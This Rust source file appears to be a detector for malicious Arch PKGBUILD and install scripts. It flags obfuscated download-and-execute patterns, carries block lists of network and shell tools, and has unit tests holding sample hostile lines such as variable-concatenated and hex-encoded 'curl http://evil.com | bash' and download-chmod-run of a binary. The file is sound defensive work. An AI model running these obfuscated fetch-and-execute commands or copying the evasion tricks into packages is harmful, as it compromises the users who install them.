use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

/// PKGBUILD standard variables that should not be tracked for obfuscation.
const PKGBUILD_STANDARD_VARS: &[&str] = &[
    "pkgname", "pkgver", "pkgrel", "epoch", "pkgdesc", "arch", "url", "license",
    "groups", "depends", "makedepends", "checkdepends", "optdepends", "provides",
    "conflicts", "replaces", "backup", "options", "install", "changelog", "source",
    "noextract", "md5sums", "sha1sums", "sha224sums", "sha256sums", "sha384sums",
    "sha512sums", "b2sums", "validpgpkeys",
    // Common build environment variables
    "CFLAGS", "CXXFLAGS", "CPPFLAGS", "LDFLAGS", "GOFLAGS", "CGO_CFLAGS",
    "CGO_CPPFLAGS", "CGO_CXXFLAGS", "CGO_LDFLAGS", "MAKEFLAGS",
    // PKGBUILD special variables
    "srcdir", "pkgdir", "startdir",
];

/// Commands that indicate malicious intent when reconstructed via obfuscation.
const DANGEROUS_COMMANDS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "bash", "sh", "python", "python3", "python2",
    "perl", "ruby", "php", "lua", "socat", "telnet",
];

/// Download-and-execute compound patterns: (downloader, executor).
const DANGEROUS_PIPES: &[(&str, &str)] = &[
    ("curl", "bash"),
    ("curl", "sh"),
    ("curl", "python"),
    ("curl", "python3"),
    ("wget", "bash"),
    ("wget", "sh"),
    ("wget", "python"),
    ("wget", "python3"),
];

/// Build tool commands whose presence indicates legitimate compilation.
const BUILD_COMMANDS: &[&str] = &[
    "make", "cmake", "cargo", "gcc", "g++", "go build", "go install", "rustc",
    "javac", "mvn", "gradle", "meson", "ninja", "configure", "python setup.py",
    "pip install", "npm run build", "yarn build", "qmake", "scons", "waf",
];

// --- Regexes (compiled once) ---

/// Matches simple variable assignments: VAR=value, VAR="value", VAR='value'
/// Also handles semicolon-separated: a=cu;b=rl
static ASSIGN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:^|;)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^;"'\s]*))"#)
        .unwrap()
});

/// Matches variable references: $VAR or ${VAR}
static VAR_REF_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?").unwrap()
});

/// Matches $(printf '\xNN') or $(printf '\NNN') subshells
static PRINTF_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\$\(\s*printf\s+['"]?\\+(x[0-9a-fA-F]{2}|[0-7]{3})['"]?\s*\)"#).unwrap()
});

/// Matches $(echo -e '\xNN') subshells
static ECHO_SUBSHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\$\(\s*echo\s+-[neE]+\s+['"]?\\+(x[0-9a-fA-F]{2}|[0-7]{3})['"]?\s*\)"#)
        .unwrap()
});

/// Long hex string (129+ hex chars; 128 = SHA-512, so 129+ avoids checksum FPs)
static LONG_HEX_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"[0-9a-fA-F]{129,}").unwrap()
});

/// Checksum array line (declaration)
static CHECKSUM_LINE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(md5|sha\d+|b2)sums").unwrap()
});

/// Checksum array opening: sha256sums=( or sha256sums_x86_64=(
static CHECKSUM_ARRAY_OPEN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(md5|sha\d+|b2)sums(_[a-zA-Z0-9_]+)?\s*=\s*\(").unwrap()
});

/// Long base64 string (100+ chars of base64 alphabet)
static LONG_BASE64_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"[A-Za-z0-9+/]{100,}={0,3}").unwrap()
});

/// Heredoc start: <<EOF, <<'EOF', <<"EOF", <<-EOF
static HEREDOC_START_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"<<-?\s*['"]?(\w+)['"]?"#).unwrap()
});

/// Download to file: curl -o, curl -O, wget -O, curl ... > file
static DOWNLOAD_TO_FILE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(curl\s+.*-[oO]\s|wget\s+.*-O\s|curl\s+.*>\s)").unwrap()
});

/// chmod +x
static CHMOD_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"chmod\s+\+x\s").unwrap()
});

// --- Feature ---

pub struct ShellAnalysis;

impl Feature for ShellAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let mut signals = Vec::new();

        if let Some(ref content) = ctx.pkgbuild_content {
            signals.extend(analyze_content(content, "", ""));
        }
        if let Some(ref content) = ctx.install_script_content {
            signals.extend(analyze_content(content, "IS-", "(in install script)"));
        }

        signals
    }
}

fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
    let env = build_var_env(content);
    let mut signals = Vec::new();
    signals.extend(analyze_variable_resolution(content, &env));
    signals.extend(analyze_indirect_execution(content, &env));
    signals.extend(analyze_charbychar_construction(content));
    signals.extend(analyze_data_blobs(content));
    signals.extend(analyze_binary_download(content));

    if !id_prefix.is_empty() {
        for sig in &mut signals {
            sig.id = format!("{}{}", id_prefix, sig.id);
            sig.description = format!("{} {}", sig.description, desc_suffix);
        }
    }

    signals
}

// --- Helpers ---

/// Build a variable environment from all assignments in the content.
fn build_var_env(content: &str) -> HashMap<String, String> {
    let standard: HashSet<&str> = PKGBUILD_STANDARD_VARS.iter().copied().collect();
    let mut env = HashMap::new();

    for line in content.lines() {
        for caps in ASSIGN_RE.captures_iter(line) {
            let name = &caps[1];
            if standard.contains(name) {
                continue;
            }
            // Value is in group 2 (double-quoted), 3 (single-quoted), or 4 (unquoted)
            let value = caps
                .get(2)
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))
                .map(|m| m.as_str())
                .unwrap_or("");
            env.insert(name.to_string(), value.to_string());
        }
    }

    env
}

/// Substitute $VAR and ${VAR} references with known values from the environment.
fn resolve_variables(line: &str, env: &HashMap<String, String>) -> String {
    VAR_REF_RE
        .replace_all(line, |caps: &regex::Captures| {
            let name = &caps[1];
            env.get(name)
                .cloned()
                .unwrap_or_else(|| caps[0].to_string())
        })
        .to_string()
}

/// Check if a resolved line contains a download-and-execute pipe pattern.
fn contains_dangerous_pipe(resolved: &str) -> Option<(&'static str, &'static str)> {
    let lower = resolved.to_lowercase();
    if !lower.contains('|') {
        return None;
    }
    let parts: Vec<&str> = lower.split('|').collect();
    for i in 0..parts.len() - 1 {
        let left = parts[i].trim();
        let right = parts[i + 1].trim();
        for &(dl, exec) in DANGEROUS_PIPES {
            if left.contains(dl) && right.contains(exec) {
                return Some((dl, exec));
            }
        }
    }
    None
}

/// Check if a resolved line contains any dangerous command not present in the original.
fn contains_new_dangerous_cmd(original: &str, resolved: &str) -> Option<&'static str> {
    let orig_lower = original.to_lowercase();
    let res_lower = resolved.to_lowercase();
    DANGEROUS_COMMANDS
        .iter()
        .find(|&&cmd| res_lower.contains(cmd) && !orig_lower.contains(cmd))
        .copied()
}

// --- Sub-Analyzers ---

/// Detect variable concatenation that resolves to dangerous commands.
fn analyze_variable_resolution(
    content: &str,
    env: &HashMap<String, String>,
) -> Vec<Signal> {
    let mut signals = Vec::new();
    let mut found_exec = false;
    let mut found_cmd = false;

    for (i, line) in content.lines().enumerate() {
        // Skip lines with no variable references
        if !line.contains('$') {
            continue;
        }

        let resolved = resolve_variables(line, env);
        if resolved == line {
            continue; // nothing was substituted
        }

        // Check for download-and-execute pipe
        if !found_exec
            && let Some((dl, exec)) = contains_dangerous_pipe(&resolved)
        {
            // Only flag if the original line didn't already have this pattern
            let orig_lower = line.to_lowercase();
            if !(orig_lower.contains(dl) && orig_lower.contains(exec)) {
                signals.push(Signal {
                    id: "SA-VAR-CONCAT-EXEC".to_string(),
                    category: SignalCategory::Pkgbuild,
                    points: 85,
                    description: format!(
                        "variable concatenation resolves to '{}|{}' (line {})",
                        dl,
                        exec,
                        i + 1
                    ),
                    is_override_gate: true,
                    matched_line: Some(line.trim().to_string()),
                });
                found_exec = true;
                continue;
            }
        }

        // Check for dangerous command appearing after resolution
        if !found_cmd
            && let Some(cmd) = contains_new_dangerous_cmd(line, &resolved)
        {
            signals.push(Signal {
                id: "SA-VAR-CONCAT-CMD".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 55,
                description: format!(
                    "variable concatenation resolves to '{}' (line {})",
                    cmd,
                    i + 1
                ),
                is_override_gate: false,
                matched_line: Some(line.trim().to_string()),
            });
            found_cmd = true;
        }

        if found_exec && found_cmd {
            break;
        }
    }

    signals
}

/// Detect variables holding dangerous commands used in execution position.
fn analyze_indirect_execution(
    content: &str,
    env: &HashMap<String, String>,
) -> Vec<Signal> {
    // Find variables whose values are dangerous commands
    let dangerous_vars: Vec<(&str, &str)> = env
        .iter()
        .filter_map(|(name, value)| {
            let lower = value.to_lowercase();
            DANGEROUS_COMMANDS
                .iter()
                .find(|&&cmd| lower == cmd)
                .map(|&cmd| (name.as_str(), cmd))
        })
        .collect();

    if dangerous_vars.is_empty() {
        return Vec::new();
    }

    for (var_name, cmd) in &dangerous_vars {
        // Check if $VAR or ${VAR} appears in execution position:
        // - after |
        // - at line start (ignoring whitespace)
        // - after ; && ||
        let pattern = format!(
            r"(?m)(?:^|\||\|\||&&|;)\s*\$\{{?{}\}}?",
            regex::escape(var_name)
        );
        if let Ok(re) = Regex::new(&pattern)
            && re.is_match(content)
        {
            let matched_line = content
                .lines()
                .find(|line| re.is_match(line))
                .map(|line| line.trim().to_string());
            return vec![Signal {
                id: "SA-INDIRECT-EXEC".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 70,
                description: format!(
                    "variable ${} holds '{}' and is used in execution position",
                    var_name, cmd
                ),
                is_override_gate: false,
                matched_line,
            }];
        }
    }

    Vec::new()
}

/// Detect char-by-char command construction via printf/echo subshells.
fn analyze_charbychar_construction(content: &str) -> Vec<Signal> {
    for (i, line) in content.lines().enumerate() {
        let printf_count = PRINTF_SUBSHELL_RE.find_iter(line).count();
        let echo_count = ECHO_SUBSHELL_RE.find_iter(line).count();
        let total = printf_count + echo_count;
        if total >= 3 {
            return vec![Signal {
                id: "SA-CHARBYCHAR-CONSTRUCT".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 75,
                description: format!(
                    "{} printf/echo subshells on line {} (char-by-char command construction)",
                    total,
                    i + 1
                ),
                is_override_gate: false,
                matched_line: Some(line.trim().to_string()),
            }];
        }
    }
    Vec::new()
}

/// Detect suspiciously encoded data blobs.
fn analyze_data_blobs(content: &str) -> Vec<Signal> {
    let mut signals = Vec::new();

    let mut in_checksum_block = false;

    for line in content.lines() {
        // Track whether we're inside a checksum array block
        if CHECKSUM_ARRAY_OPEN_RE.is_match(line) {
            in_checksum_block = true;
        }

        // Skip checksum array lines (both declaration and value lines)
        let skip = in_checksum_block || CHECKSUM_LINE_RE.is_match(line);

        if in_checksum_block && line.contains(')') {
            in_checksum_block = false;
        }

        if skip {
            continue;
        }

        // Long hex strings
        if signals.iter().all(|s: &Signal| s.id != "SA-DATA-BLOB-HEX")
            && LONG_HEX_RE.is_match(line)
        {
            signals.push(Signal {
                id: "SA-DATA-BLOB-HEX".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 50,
                description: "embedded long hex string (possible encoded payload)".to_string(),
                is_override_gate: false,
                matched_line: Some(line.trim().to_string()),
            });
        }

        // Long base64 strings
        if signals.iter().all(|s: &Signal| s.id != "SA-DATA-BLOB-BASE64")
            && LONG_BASE64_RE.is_match(line)
        {
            // Avoid flagging lines that also match hex (already caught above)
            if !LONG_HEX_RE.is_match(line) {
                signals.push(Signal {
                    id: "SA-DATA-BLOB-BASE64".to_string(),
                    category: SignalCategory::Pkgbuild,
                    points: 50,
                    description: "embedded long base64 string (possible encoded payload)"
                        .to_string(),
                    is_override_gate: false,
                    matched_line: Some(line.trim().to_string()),
                });
            }
        }
    }

    // Heredoc entropy analysis
    signals.extend(analyze_heredoc_entropy(content));

    signals
}

/// Detect high-entropy heredoc bodies.
fn analyze_heredoc_entropy(content: &str) -> Vec<Signal> {
    let lines: Vec<&str> = content.lines().collect();
    let mut i = 0;

    while i < lines.len() {
        if let Some(caps) = HEREDOC_START_RE.captures(lines[i]) {
            let delimiter = &caps[1];
            let mut body = String::new();
            i += 1;
            while i < lines.len() {
                if lines[i].trim() == delimiter {
                    break;
                }
                body.push_str(lines[i]);
                body.push('\n');
                i += 1;
            }

            if body.len() > 200 {
                let entropy = shannon_entropy(&body);
                if entropy > 5.0 {
                    return vec![Signal {
                        id: "SA-HIGH-ENTROPY-HEREDOC".to_string(),
                        category: SignalCategory::Pkgbuild,
                        points: 55,
                        description: format!(
                            "heredoc with high entropy ({:.1} bits/byte, {} bytes)",
                            entropy,
                            body.len()
                        ),
                        is_override_gate: false,
                        matched_line: None,
                    }];
                }
            }
        }
        i += 1;
    }

    Vec::new()
}

/// Calculate Shannon entropy in bits per byte.
fn shannon_entropy(s: &str) -> f64 {
    let len = s.len() as f64;
    if len == 0.0 {
        return 0.0;
    }
    let mut freq = HashMap::new();
    for &b in s.as_bytes() {
        *freq.entry(b).or_insert(0usize) += 1;
    }
    freq.values()
        .map(|&count| {
            let p = count as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Detect download + chmod +x without any compilation step.
fn analyze_binary_download(content: &str) -> Vec<Signal> {
    let has_download = DOWNLOAD_TO_FILE_RE.is_match(content);
    let has_chmod_exec = CHMOD_EXEC_RE.is_match(content);

    if !has_download || !has_chmod_exec {
        return Vec::new();
    }

    let lower = content.to_lowercase();
    let has_build_cmd = BUILD_COMMANDS.iter().any(|&cmd| lower.contains(cmd));

    if has_build_cmd {
        return Vec::new();
    }

    let matched_line = content
        .lines()
        .find(|line| DOWNLOAD_TO_FILE_RE.is_match(line))
        .map(|line| line.trim().to_string());
    vec![Signal {
        id: "SA-BINARY-DOWNLOAD-NOCOMPILE".to_string(),
        category: SignalCategory::Pkgbuild,
        points: 60,
        description: "downloads file and chmod +x with no compilation step".to_string(),
        is_override_gate: false,
        matched_line,
    }]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: Some(content.into()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        ShellAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    // --- Variable Resolution ---

    #[test]
    fn var_concat_curl_pipe_bash() {
        let ids = analyze("a=cu\nb=rl\n$a$b http://evil.com | bash");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_semicolon_separated() {
        let ids = analyze("a=cu;b=rl\n$a$b http://evil.com | sh");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_quoted_values() {
        let ids = analyze("cmd=\"cur\"\ncmd2=\"l\"\n$cmd$cmd2 http://evil.com | bash");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_single_quoted() {
        let ids = analyze("a='wg'\nb='et'\n$a$b http://evil.com/payload -O /tmp/p");
        assert!(has(&ids, "SA-VAR-CONCAT-CMD"));
    }

    #[test]
    fn var_concat_wget_pipe() {
        let ids = analyze("x=wg\ny=et\n$x$y -q -O- http://evil.com | bash");
        assert!(has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    #[test]
    fn var_concat_benign_no_signal() {
        let ids = analyze("prefix=/usr\ninstall -Dm755 binary ${prefix}/bin/tool");
        assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"));
        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"));
    }

    #[test]
    fn var_concat_standard_vars_ignored() {
        let ids = analyze("pkgname=curl\ninstall -Dm755 $pkgname \"$pkgdir/usr/bin/$pkgname\"");
        assert!(!has(&ids, "SA-VAR-CONCAT-CMD"));
        assert!(!has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn var_concat_already_visible_no_duplicate() {
        // curl is already visible in the original line, should not double-flag
        let ids = analyze("x=foo\ncurl http://example.com | bash");
        assert!(!has(&ids, "SA-VAR-CONCAT-EXEC"));
    }

    // --- Indirect Execution ---

    #[test]
    fn indirect_exec_pipe_to_var() {
        let ids = analyze("x=bash\necho id | $x");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_var_at_line_start() {
        let ids = analyze("cmd=python3\n$cmd -c 'import os'");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_after_semicolon() {
        let ids = analyze("s=sh\necho test; $s -c 'id'");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_benign_var() {
        let ids = analyze("editor=vim\n$editor file.txt");
        assert!(!has(&ids, "SA-INDIRECT-EXEC"));
    }

    #[test]
    fn indirect_exec_braces() {
        let ids = analyze("c=bash\necho payload | ${c}");
        assert!(has(&ids, "SA-INDIRECT-EXEC"));
    }

    // --- Char-by-Char Construction ---

    #[test]
    fn charbychar_printf_subshells() {
        let ids =
            analyze(r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com");
        assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    #[test]
    fn charbychar_echo_subshells() {
        let ids = analyze(
            r"$(echo -e '\x62')$(echo -e '\x61')$(echo -e '\x73')$(echo -e '\x68')",
        );
        assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    #[test]
    fn charbychar_mixed_printf_echo() {
        let ids = analyze(
            r"$(printf '\x63')$(echo -e '\x75')$(printf '\x72')$(printf '\x6c')",
        );
        assert!(has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    #[test]
    fn charbychar_two_subshells_no_signal() {
        let ids = analyze(r"$(printf '\x63')$(printf '\x75')rl");
        assert!(!has(&ids, "SA-CHARBYCHAR-CONSTRUCT"));
    }

    // --- Data Blobs ---

    #[test]
    fn data_blob_long_hex() {
        let hex = "a1".repeat(80); // 160 hex chars
        let ids = analyze(&format!("data=\"{hex}\""));
        assert!(has(&ids, "SA-DATA-BLOB-HEX"));
    }

    #[test]
    fn data_blob_checksum_not_flagged() {
        let hex = "a1".repeat(80);
        let ids = analyze(&format!("sha256sums=('{hex}')"));
        assert!(!has(&ids, "SA-DATA-BLOB-HEX"));
    }

    #[test]
    fn data_blob_long_base64() {
        let b64 = "A".repeat(120);
        let ids = analyze(&format!("payload=\"{b64}\""));
        assert!(has(&ids, "SA-DATA-BLOB-BASE64"));
    }

    #[test]
    fn data_blob_short_hex_no_signal() {
        let hex = "a1b2c3d4e5f6";
        let ids = analyze(&format!("hash=\"{hex}\""));
        assert!(!has(&ids, "SA-DATA-BLOB-HEX"));
    }

    #[test]
    fn high_entropy_heredoc() {
        // Generate high-entropy content (diverse byte values)
        let body: String = (0..300)
            .map(|i| (33 + ((i * 7 + 13) % 94)) as u8 as char)
            .collect();
        let ids = analyze(&format!("cat <<EOF\n{body}\nEOF"));
        assert!(has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
    }

    #[test]
    fn low_entropy_heredoc_no_signal() {
        let body = "This is a normal help message.\nPlease run the program.\n".repeat(5);
        let ids = analyze(&format!("cat <<EOF\n{body}\nEOF"));
        assert!(!has(&ids, "SA-HIGH-ENTROPY-HEREDOC"));
    }

    // --- Binary Download ---

    #[test]
    fn binary_download_no_build() {
        let ids = analyze(
            "curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool",
        );
        assert!(has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    #[test]
    fn binary_download_with_make_no_signal() {
        let ids = analyze(
            "curl -o src.tar.gz https://example.com/src.tar.gz\ntar xf src.tar.gz\nmake\nchmod +x output\n",
        );
        assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    #[test]
    fn binary_download_with_cargo_no_signal() {
        let ids = analyze(
            "wget -O src.tar.gz https://example.com/src.tar.gz\nchmod +x build.sh\ncargo build\n",
        );
        assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    #[test]
    fn download_without_chmod_no_signal() {
        let ids = analyze("curl -o /tmp/data https://example.com/data.json");
        assert!(!has(&ids, "SA-BINARY-DOWNLOAD-NOCOMPILE"));
    }

    // --- Benign PKGBUILD ---

    #[test]
    fn benign_pkgbuild_no_signals() {
        let ids = analyze(
            r#"
pkgname=yay
pkgver=12.4.2
pkgrel=1
arch=('x86_64')
depends=('pacman' 'git')
makedepends=('go')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc1')

build() {
    cd "$pkgname-$pkgver"
    export CGO_CPPFLAGS="${CPPFLAGS}"
    export GOFLAGS="-buildmode=pie -trimpath"
    go build
}

package() {
    install -Dm755 yay "${pkgdir}/usr/bin/yay"
}
"#,
        );
        assert!(ids.is_empty(), "benign PKGBUILD should trigger no signals, got: {ids:?}");
    }

    // --- SHA-512 checksum false positive regression ---

    #[test]
    fn data_blob_sha512_not_flagged() {
        let sha512 = "a1".repeat(64); // exactly 128 hex chars = SHA-512
        let ids = analyze(&format!("sha512sums=('{sha512}')"));
        assert!(!has(&ids, "SA-DATA-BLOB-HEX"), "SHA-512 checksum should not trigger");
    }

    #[test]
    fn data_blob_sha512_multiline_not_flagged() {
        let sha512 = "a1".repeat(64);
        let content = format!("sha512sums=('{sha512}'\n            '{sha512}')");
        let ids = analyze(&content);
        assert!(!has(&ids, "SA-DATA-BLOB-HEX"), "SHA-512 in multi-line array should not trigger");
    }

    // --- Install script analysis ---

    fn analyze_install(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: Some(content.into()),
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        ShellAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    #[test]
    fn install_var_concat_curl_pipe_bash() {
        let ids = analyze_install("a=cu\nb=rl\n$a$b http://evil.com | bash");
        assert!(has(&ids, "IS-SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn install_indirect_exec() {
        let ids = analyze_install("x=bash\necho id | $x");
        assert!(has(&ids, "IS-SA-INDIRECT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn install_charbychar() {
        let ids = analyze_install(
            r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com",
        );
        assert!(has(&ids, "IS-SA-CHARBYCHAR-CONSTRUCT"), "got: {ids:?}");
    }

    #[test]
    fn install_data_blob_hex() {
        let hex = "a1".repeat(80);
        let ids = analyze_install(&format!("data=\"{hex}\""));
        assert!(has(&ids, "IS-SA-DATA-BLOB-HEX"), "got: {ids:?}");
    }

    #[test]
    fn install_binary_download() {
        let ids = analyze_install(
            "curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool",
        );
        assert!(has(&ids, "IS-SA-BINARY-DOWNLOAD-NOCOMPILE"), "got: {ids:?}");
    }

    #[test]
    fn install_benign_no_signals() {
        let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
        assert!(ids.is_empty(), "benign install script should trigger no signals, got: {ids:?}");
    }
}
